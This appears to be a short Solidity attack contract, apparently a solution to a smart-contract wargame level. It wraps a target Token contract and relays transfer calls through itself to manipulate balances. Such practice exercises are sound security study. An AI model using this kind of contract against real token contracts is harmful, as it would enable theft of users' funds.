pragma solidity 0.6.0;

import "./Token.sol";

contract Token_Attack {
  
    Token _contract;
    address payable public owner;

    constructor(address payable _add) public {
        owner = msg.sender;
        _contract = Token(_add);
    }

    function transfer(address _to, uint _value) public {
        _contract.transfer(_to, _value);
    }

}